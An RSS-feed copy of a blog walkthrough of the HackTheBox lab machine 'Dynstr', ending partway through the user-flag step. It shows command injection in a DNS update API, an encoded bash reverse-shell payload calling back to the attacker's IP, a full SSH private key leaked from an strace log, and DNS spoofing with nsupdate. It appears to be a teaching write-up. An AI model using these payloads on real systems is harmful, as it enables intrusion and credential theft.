<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Linux on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/linux/</link>
    <description>Recent content in Linux on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 18 Oct 2021 03:04:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Dynstr</title>
      <link>https://fahmifj.github.io/hackthebox/dynstr/</link>
      <pubDate>Mon, 18 Oct 2021 03:04:29 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/dynstr/</guid>
      <description>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, which allows me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after spoofing one of the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection.</description>
      <content:encoded><![CDATA[<p>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, which allows me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after spoofing one of the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Command injection</li>
<li>Dynamic DNS</li>
<li>Wildcard injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers 3 open ports: SSH on 22, BIND 9 DNS on 53, and an Apache web server on 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53» 
$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport-dynstr 10.10.10.244
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:06 EDT
Nmap scan report <span class="k">for</span> 10.10.10.244
Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.078s latency<span class="o">)</span>.
Not shown: <span class="m">65532</span> closed ports
Reason: <span class="m">65532</span> resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
53/tcp open  domain  syn-ack ttl <span class="m">63</span>
80/tcp open  http    syn-ack ttl <span class="m">63</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 41.14 seconds

→ root@kali «dynstr» «10.10.14.53» 
$ nmap -p22,53,80 -sC -sV -oA nmap/10-tcp-allport-scripts-dynstr 10.10.10.244
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:07 EDT
Nmap scan report <span class="k">for</span> 10.10.10.244
Host is up <span class="o">(</span>0.54s latency<span class="o">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
53/tcp open  domain  ISC BIND 9.16.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
<span class="p">|</span> dns-nsid: 
<span class="p">|</span>_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Dyna DNS
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 20.76 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>On port 80, there is a company website named <strong>DYNA DNS</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210617082250725.png" alt="image-20210617082250725"  /></div>
</p>
<p>This company offers a <a href="https://www.youtube.com/watch?v=rOLGvZagdC0">dynamic DNS</a> service and states that the service is still in beta. There is also shared credentials to use this service.</p>
<p><div class="img-container"><img src="imgs/image-20210617082428463.png" alt="image-20210617082428463"  /></div>
</p>
<p>At the bottom of the page, it reveals another domain name: <code>dyna.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210617082655557.png" alt="image-20210617082655557"  /></div>
</p>
<p>I will update my <code>/etc/hosts</code> with all the discovered domain names :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.244 dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb&#39;</span> 
</code></pre></div><p>These domain points to the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53» 
$ curl -s http://10.10.10.244/ <span class="p">|</span> wc -c
<span class="m">10909</span>
→ root@kali «dynstr» «10.10.14.53» 
$ <span class="k">for</span> i in dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb<span class="p">;</span> <span class="k">do</span> curl -s http://<span class="nv">$i</span>/ <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span> 
<span class="m">10909</span>
<span class="m">10909</span>
<span class="m">10909</span>
<span class="m">10909</span>
</code></pre></div><h3 id="dns-api">DNS API</h3>
<p>As previously stated in the website, it seems to use the dynamic DNS service, I can refer to <a href="https://www.noip.com/integrate/request">no-ip.com</a>:</p>
<p><div class="img-container"><img src="imgs/image-20210617090837052.png" alt="image-20210617090837052"  /></div>
</p>
<p>To use the service, I will send a request and supply the shared credentials (<code>'dynadns:sndanyd'</code>) in the Authorization header:</p>
<p><div class="img-container"><img src="imgs/image-20210617091044264.png" alt="image-20210617091044264"  /></div>
</p>
<p>It returned with <code>good</code>.</p>
<p>With <code>dig</code>, I can confirm that my domain name has been added to the DNS entry.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53»
$ dig @10.10.10.244 iamf.no-ip.htb

<span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.no-ip.htb
<span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
<span class="p">;;</span> global options: +cmd
<span class="p">;;</span> Got answer:
<span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">38459</span>
<span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
<span class="p">;;</span> WARNING: recursion requested but not available

<span class="p">;;</span> OPT PSEUDOSECTION:
<span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
<span class="p">;</span> COOKIE: a795fc705ec31c660100000060cab226fe335467b6b169e8 <span class="o">(</span>good<span class="o">)</span>
<span class="p">;;</span> QUESTION SECTION:
<span class="p">;</span>iamf.no-ip.htb.                        IN      A

<span class="p">;;</span> ANSWER SECTION:
iamf.no-ip.htb.         <span class="m">30</span>      IN      A       10.10.14.53

<span class="p">;;</span> Query time: <span class="m">864</span> msec
<span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
<span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:23:34 EDT <span class="m">2021</span>
<span class="p">;;</span> MSG SIZE  rcvd: <span class="m">87</span>
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="identify-command-injection">Identify Command Injection</h4>
<p>On Linux, there is a dynamic DNS utility called <a href="https://linux.die.net/man/8/nsupdate"><code>nsupdate</code></a>. If the backend uses this utility with no sanitization on the input, it is possible to do a command injection.</p>
<p>For the first attempt, I try to submit a semicolon, and it fails the update process.</p>
<p><div class="img-container"><img src="imgs/image-20210617091628552.png" alt="image-20210617091628552"  /></div>
</p>
<p>If I search for that error on Google, I will see <a href="https://stackoverflow.com/questions/46604333/nsupdate-fail-when-called-in-php-with-exec-function">this post</a> from StackOverflow, which shows how <code>nsupdate</code> is executed from PHP using the built-in <code>exec()</code> function.</p>
<p><div class="img-container"><img src="imgs/image-20211018060424803.png" alt="image-20211018060424803"  /></div>
</p>
<p>By assuming that my input falls in <code>update add $MYINPUT.no-ip.htb ...</code>, I try to submit  <strong>`echo+iamf1`</strong>.<div class="img-container"><img src="imgs/image-20210617093614041.png" alt="image-20210617093614041"  /></div>
</p>
<p>It again responded with &ldquo;good&rdquo;.</p>
<p>Checking with <code>dig</code> shows that my domain <code>iamf1.no-ip.htb</code> has been added to the DNS entry. This means the API is vulnerable to command injection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53»
$ dig @10.10.10.244 iamf1.no-ip.htb

<span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf1.no-ip.htb
<span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
<span class="p">;;</span> global options: +cmd
<span class="p">;;</span> Got answer:
<span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">65360</span>
<span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
<span class="p">;;</span> WARNING: recursion requested but not available

<span class="p">;;</span> OPT PSEUDOSECTION:
<span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
<span class="p">;</span> COOKIE: 8164817dd17125330100000060cab5248a60afa8ae9615d7 <span class="o">(</span>good<span class="o">)</span>
<span class="p">;;</span> QUESTION SECTION:
<span class="p">;</span>iamf1.no-ip.htb.               IN      A

<span class="p">;;</span> ANSWER SECTION:
iamf1.no-ip.htb.        <span class="m">30</span>      IN      A       10.10.14.53

<span class="p">;;</span> Query time: <span class="m">735</span> msec
<span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
<span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:36:20 EDT <span class="m">2021</span>
<span class="p">;;</span> MSG SIZE  rcvd: <span class="m">88</span>
</code></pre></div><p>I also assume that the update command is enclosed with <code>EOF</code>, and when I put <code>&quot;</code> to enclose it, the server response leaks how it updates the DNS entry.</p>
<p><div class="img-container"><img src="imgs/image-20210617101554395.png" alt="image-20210617101554395"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>To avoid bad characters, I will encode the reverse shell payload with double base64.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53» 
$ <span class="nb">echo</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/9000 0&gt;&amp;1&#39;&#34;</span> <span class="p">|</span>base64 <span class="p">|</span>base64 -w0
<span class="nv">WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg</span><span class="o">==</span>
</code></pre></div><p>The final query will looks like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">/nic/update?hostname=&#34;`echo+WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg==+|base64+-d|base64+-d|bash`+iamf.no-ip.htb&amp;myip=10.10.14.53
</code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53»
$ nc -nvlp <span class="m">9000</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
connect to <span class="o">[</span>10.10.14.53<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.244<span class="o">]</span> <span class="m">49648</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>659<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@dynstr:/var/www/html/nic$ id
id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div><p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/var/www/html/nic$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
www-data@dynstr:/var/www/html/nic$ which python3
which python3
/usr/bin/python3
www-data@dynstr:/var/www/html/nic$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
<span class="s1">&#39;ython3 -c &#39;</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="o">)</span><span class="err">&#39;</span>
www-data@dynstr:/var/www/html/nic$ ^Z
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> suspended  nc -nvlp <span class="m">9000</span>
→ root@kali «dynstr» «10.10.14.53»
$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> continued  nc -nvlp <span class="m">9000</span>

www-data@dynstr:/var/www/html/nic$ 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-bindmgr">Shell as bindmgr</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Under <code>/home/bindmgr/support-case-C62796521</code>, there are several files that are readable by others.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/home$ ls -laR
...<span class="o">[</span>SNIP<span class="o">]</span>...
./bindmgr:
total <span class="m">8</span>
drwxr-xr-x <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 .ssh
drwxr-xr-x <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 support-case-C62796521
-r-------- <span class="m">1</span> bindmgr bindmgr   <span class="m">33</span> Jun <span class="m">17</span> 10:51 user.txt
./bindmgr/.ssh/:
total <span class="m">8</span>
-rw-r--r-- <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 authorized_keys
-rw-r--r-- <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 id_rsa
...<span class="o">[</span>SNIP<span class="o">]</span>...
./bindmgr/support-case-C62796521:
total <span class="m">428</span>
-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">237141</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.script
-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">29312</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.timing
-rw-r--r-- <span class="m">1</span> bindmgr bindmgr   <span class="m">1175</span> Mar <span class="m">13</span> 14:53 command-output-C62796521.txt
-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">163048</span> Mar <span class="m">13</span> 14:52 strace-C62796521.txt

./dyna:
total <span class="m">0</span>
</code></pre></div><p>The <code>strace-C62796521.txt</code> file contains a SSH private key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat strace-C62796521.txt
...<span class="o">[</span>SNIP<span class="o">]</span>...
<span class="m">15123</span> openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/home/bindmgr/.ssh/id_rsa&#34;</span>, O_RDONLY<span class="o">)</span> <span class="o">=</span> <span class="m">5</span>
<span class="m">15123</span> fstat<span class="o">(</span>5, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0600, <span class="nv">st_size</span><span class="o">=</span>1823, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
<span class="m">15123</span> read<span class="o">(</span>5, <span class="s2">&#34;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n&#34;</span>, 4096<span class="o">)</span> <span class="o">=</span> <span class="m">1823</span>
</code></pre></div><p>But when I try to use that key for SSH login, it asks for a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «ssh-keys» «10.10.14.53»
$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
bindmgr@10.10.10.244<span class="err">&#39;</span>s password:
</code></pre></div><p>My first guess is SSH has been configured to password only, but I find that <a href="https://unix.stackexchange.com/questions/56941/what-is-the-point-of-sshd-usedns-option">UseDNS</a> is enabled here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/home$ cat /etc/ssh/sshd_config <span class="p">|</span> grep -v <span class="s1">&#39;^#&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;NF&#39;</span>
Include /etc/ssh/sshd_config.d/*.conf
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
UseDNS yes
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
</code></pre></div><p>Then if I look at the authorized keys, it seems SSH login only possible from a specific domain that starts with <code>*.infra.dyna.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/home/bindmgr$ cat .ssh/authorized_keys
<span class="nv">from</span><span class="o">=</span><span class="s2">&#34;*.infra.dyna.htb&#34;</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
</code></pre></div><h4 id="update-dns">Update DNS</h4>
<p>Looking at the DNS configuration under <code>/etc/bind</code> reveals that <code>dyna.htb</code> is not available for customers (via API) and it uses different key (<code>/etc/bind/infra.key</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/etc/bind/$ cat named.conf.local
//
// Do any <span class="nb">local</span> configuration here
//

// Add infrastructure DNS updates.
include <span class="s2">&#34;/etc/bind/infra.key&#34;</span><span class="p">;</span>
zone <span class="s2">&#34;dyna.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dyna.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
zone <span class="s2">&#34;10.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;10.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
zone <span class="s2">&#34;168.192.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;168.192.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
// Enable DynDNS updates to customer zones.
include <span class="s2">&#34;/etc/bind/ddns.key&#34;</span><span class="p">;</span>
zone <span class="s2">&#34;dnsalias.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dnsalias.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
zone <span class="s2">&#34;dynamicdns.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dynamicdns.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
zone <span class="s2">&#34;no-ip.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;no-ip.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant ddns-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>

// *** WORK IN PROGRESS, see bindmgr.sh ***
// include <span class="s2">&#34;/etc/bind/named.conf.bindmgr&#34;</span><span class="p">;</span>
</code></pre></div><p>The idea here is to add a sub domain to <code>dyna.htb</code> zone, and it must be part of <code>infra.dyna.htb</code>, such as <code>iamf.infra.dyna.htb</code>. I will also point that domain to my IP so I can SSH from my machine. These all can be done with the following commands.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@dynstr:/etc/bind$ nsupdate -k ./infra.key
&gt; update add iamf.infra.dyna.htb <span class="m">3600</span> A 10.10.14.53
&gt; update add 53.14.10.10.in-addr.arpa. <span class="m">600</span> PTR iamf.infra.dyna.htb
&gt; show
Outgoing update query:
<span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: UPDATE, status: NOERROR, id:      <span class="m">0</span>
<span class="p">;;</span> flags:<span class="p">;</span> ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: <span class="m">0</span>
<span class="p">;;</span> UPDATE SECTION:
iamf.infra.dyna.htb.    <span class="m">0</span>       ANY     A
iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53
53.14.10.10.in-addr.arpa. <span class="m">600</span>   IN      PTR     iamf.infra.dyna.htb.

&gt; send
</code></pre></div><p>I can confirm with dig that my domain has been added.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «dynstr» «10.10.14.53» 
$ dig @10.10.10.244 iamf.infra.dyna.htb

<span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.infra.dyna.htb
<span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
<span class="p">;;</span> global options: +cmd
<span class="p">;;</span> Got answer:
<span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">56211</span>
<span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
<span class="p">;;</span> WARNING: recursion requested but not available

<span class="p">;;</span> OPT PSEUDOSECTION:
<span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
<span class="p">;</span> COOKIE: 7d13ea1a1d5d21b90100000060cb40c0b256362f3bd3da35 <span class="o">(</span>good<span class="o">)</span>
<span class="p">;;</span> QUESTION SECTION:
<span class="p">;</span>iamf.infra.dyna.htb.           IN      A

<span class="p">;;</span> ANSWER SECTION:
iamf.infra.dyna.htb.    <span class="m">3600</span>    IN      A       10.10.14.53

<span class="p">;;</span> Query time: <span class="m">59</span> msec
<span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
<span class="p">;;</span> WHEN: Thu Jun <span class="m">17</span> 08:31:59 EDT <span class="m">2021</span>
<span class="p">;;</span> MSG SIZE  rcvd: <span class="m">92</span>
</code></pre></div><h4 id="ssh-bindmgr">SSH bindmgr</h4>
<p>Now I can SSH login as bindmgr</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «ssh-keys» «10.10.14.53»
$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
Last login: Tue Jun  <span class="m">8</span> 19:19:17 <span class="m">2021</span> from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
bindmgr@dynstr:~$ id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span>
</code></pre></div><p>The flag:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:~$ ls -l
total <span class="m">8</span>
